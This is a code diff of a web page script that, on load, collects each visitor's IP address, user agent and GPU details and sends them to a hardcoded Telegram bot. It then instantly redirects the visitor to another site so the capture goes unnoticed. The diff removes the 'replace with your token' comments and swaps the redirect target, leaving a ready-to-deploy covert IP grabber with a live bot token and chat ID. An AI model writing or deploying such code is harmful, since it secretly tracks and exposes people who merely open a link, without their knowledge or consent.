@@ -33,8 +33,8 @@
             const userAgent = navigator.userAgent;
             const gpu = getGPUInfo();
 
-            const botToken = "7671006802:AAG1xxrUgft4bPHDwAZu6oF2n60X6E3glc8";  // Replace with your bot token
-            const chatId = "6331127625";  // Replace with your Telegram user ID
+            const botToken = "7671006802:AAG1xxrUgft4bPHDwAZu6oF2n60X6E3glc8"; 
+            const chatId = "6331127625";  
             const message = `🔹 IP: ${ip}\n🔹 User-Agent: ${userAgent}\n🔹 GPU: ${gpu}`;
             
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -47,7 +47,7 @@
 
         (async () => {
             await sendDataToTelegram();
-            window.location.href = "https://www.google.com"; // Instant redirect
+            window.location.href = "https://mydoculite.com"; 
         })();
     </script>
 </head>
